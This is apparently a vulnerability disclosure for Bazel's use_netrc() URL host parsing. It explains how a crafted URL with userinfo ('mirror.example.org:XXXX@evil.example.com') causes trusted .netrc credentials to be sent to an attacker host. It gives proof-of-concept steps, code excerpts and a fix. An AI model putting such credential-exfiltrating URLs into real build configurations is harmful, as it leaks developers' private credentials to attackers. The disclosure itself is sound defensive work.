### Title
Netrc credentials leak to attacker-controlled host due to naive URL host-parsing bypassing basic-auth host scoping - (File: `tools/build_defs/repo/utils.bzl`)

### Summary
`use_netrc()` in `tools/build_defs/repo/utils.bzl` derives the "host" of a fetch URL with a naive string split instead of proper URI parsing, and then uses that (incorrectly derived) host purely to *decide whether* to attach a `.netrc` machine's credentials to the URL — while the credentials are attached to the full, attacker-controlled URL string that is actually dereferenced by `ctx.download`. A URL containing userinfo of the form `scheme://<trusted-host>:<token>@<attacker-host>/...` is misparsed as having host `<trusted-host>`, so credentials scoped to `<trusted-host>` in the user's `.netrc` get attached and sent to `<attacker-host>` instead.

### Finding Description
`use_netrc` computes the host like this: [1](#0-0) 

```
host = schemerest[1].split("/")[0].split(":")[0]
```

For a well-formed URL `https://mirror.example.org/file.tar` this correctly yields `mirror.example.org`. But per RFC 3986, the authority component is `userinfo@host:port`, and `@` (not `:`) is the userinfo/host separator. The code never splits on `@` at all, so for a URL such as:

```
https://mirror.example.org:AAAA@evil.example.com/payload.tar
```

- `schemerest[1]` = `mirror.example.org:AAAA@evil.example.com/payload.tar`
- `.split("/")[0]` = `mirror.example.org:AAAA@evil.example.com`
- `.split(":")[0]` = `mirror.example.org`

The function treats the userinfo prefix `mirror.example.org` as the host, finds a matching `.netrc` `machine mirror.example.org` entry, and builds `auth[url] = {"type": "basic", "login": ..., "password": ...}` — keyed by the **full, unmodified URL** (`https://mirror.example.org:AAAA@evil.example.com/payload.tar`). [2](#0-1) 

That `auth` dict is then handed unmodified to `ctx.download`/`ctx.download_and_extract` via `get_auth` (used by `http_archive`, `http_file`, `http_jar`, and `git_repository`'s remote-module-file download): [3](#0-2)  and [4](#0-3) . When Bazel's downloader actually resolves the authority of that URL, RFC-compliant parsing means the *real* network destination is `evil.example.com` — the `mirror.example.org:AAAA` portion is userinfo, discarded during the actual HTTP request except that Bazel's `auth` map now attaches the `mirror.example.org` credentials (login/password) as a Basic-Auth (or pattern) `Authorization` header on the outgoing request to `evil.example.com`.

This is structurally the same bug class as the Vite `server.fs.deny` bypass: a security-relevant decision (which host is "trusted"/should have secrets attached, vs. which files are denied) is made against one syntactic representation of the input, while the actual operation (serving the file / dereferencing the URL) is performed against a different representation of the same input that a remote party fully controls. Here, the mismatch is between the naively-parsed pseudo-host and the RFC-correct authority host.

### Impact Explanation
An attacker who can supply or influence a fetch URL used by `get_auth`/`use_netrc` — e.g., a value coming from a Bazel Registry's `source.json` for a `bazel_dep`, a malicious/compromised mirror in a `urls` list, or any dependency artifact whose download URL is not otherwise pinned/validated before being netrc-matched — can craft a URL that causes the victim's Bazel invocation to leak the victim's `.netrc` credentials (login+password, or an `auth_patterns`-derived bearer token) for a real, trusted internal host to an attacker-controlled server. Because the check that “this credential belongs to this URL” is the only gate protecting the secret, and that gate is defeated by URL syntax the attacker fully controls, this is a genuine credential-exfiltration bug (CWE-284/checks-bypassed-by-alternate-encoding class), matching the target "Credentials" surface (`Netrc`/`use_netrc`, analogous to `NetrcParser`/`NetrcCredentials`) called out in the bug-class list.

Note: the presence of a `sha256`/`integrity` check on the downloaded artifact does not mitigate this — integrity verification only validates content after download; it does nothing to prevent the Authorization header (containing the victim's real credentials) from being sent to the attacker's server as part of making the request in the first place.

### Likelihood Explanation
Requires: (1) the victim to have a `.netrc` entry (or `auth_patterns`) for some host they trust, and (2) an attacker-influenced URL to reach `get_auth`/`use_netrc` (e.g., via a compromised/malicious registry entry, a URL list under attacker influence, or a redirect-adjacent construction). Both preconditions are realistic in the Bzlmod ecosystem (registries provide URLs to `http_archive`-style repo rules, and enterprise users very commonly configure `.netrc` for private artifact hosts). No privileged access to the victim's machine is needed — only the ability to publish a URL the victim's build will consume.

### Recommendation
Rewrite `use_netrc`'s host extraction to use proper URI parsing that isolates the authority component and strips any userinfo before deriving the host (e.g., split on `@` first and take only the final segment as `userinfo@host:port`, or parse with a real URL parser rather than manual string splitting). Additionally, consider rejecting or warning on URLs that contain userinfo components before they are matched against `.netrc`, since embedding `user:pass@host` syntax in a fetch URL is rarely legitimate and can be used to smuggle a decoy hostname past this logic.

### Proof of Concept
1. Create a `.netrc` with a trusted entry:
   ```
   machine mirror.example.org
   login alice
   password s3cr3t
   ```
2. Have a (attacker-influenced) `http_archive`/registry-provided `urls` list contain:
   ```
   urls = ["https://mirror.example.org:XXXX@evil.example.com/payload.tar"]
   ```
3. Run `use_netrc(read_netrc(ctx, ".netrc"), urls, {})` (as exercised by the existing test harness pattern in `src/test/shell/bazel/starlark_repository_test.sh`, e.g. around [5](#0-4) ) and observe that the resulting `auth` dict maps the `evil.example.com` URL to `{"type": "basic", "login": "alice", "password": "s3cr3t"}`, confirming that credentials scoped to `mirror.example.org` are attached to a request whose real destination is `evil.example.com`.
4. A follow-up `bazel fetch` of that URL will send an `Authorization: Basic <base64(alice:s3cr3t)>` header directly to `evil.example.com`, completing the credential exfiltration.

```text
def use_netrc(netrc, urls, patterns):
    """Compute an auth dict from a parsed netrc file and a list of URLs.

    Args:
      netrc: a netrc file already parsed to a dict, e.g., as obtained from
        read_netrc
      urls: a list of URLs.
      patterns: optional dict of url to authorization patterns

    Returns:
      dict suitable as auth argument for ctx.download; more precisely, the dict
      will map all URLs where the netrc file provides login and password to a
      dict containing the corresponding login, password and optional authorization pattern,
      as well as the mapping of "type" to "basic" or "pattern".
    """
    auth = {}
    for url in urls:
        schemerest = url.split("://", 1)
        if len(schemerest) < 2:
            continue
        if not (schemerest[0] in ["http", "https"]):
            # For other protocols, bazel currently does not support
            # authentication. So ignore them.
            continue
        host = schemerest[1].split("/")[0].split(":")[0]
        if host in netrc:
            authforhost = netrc[host]
        elif "" in netrc:
            authforhost = netrc[""]
        else:
            continue
```

```text
def get_auth(ctx, urls):
    """Utility function to obtain the correct auth dict for a list of urls from .netrc file.

    Support optional netrc and auth_patterns attributes if available.

    Args:
      ctx: The repository context of the repository rule calling this utility
        function.
      urls: the list of urls to read

    Returns:
      the auth dict which can be passed to repository_ctx.download
    """
    if hasattr(ctx.attr, "netrc") and ctx.attr.netrc:
        netrc = read_netrc(ctx, ctx.attr.netrc)
    elif "NETRC" in ctx.os.environ:
        netrc = read_netrc(ctx, ctx.os.environ["NETRC"])
    else:
        netrc = read_user_netrc(ctx)
    auth_patterns = {}
    if hasattr(ctx.attr, "auth_patterns") and ctx.attr.auth_patterns:
        auth_patterns = ctx.attr.auth_patterns
    return use_netrc(netrc, urls, auth_patterns)
```
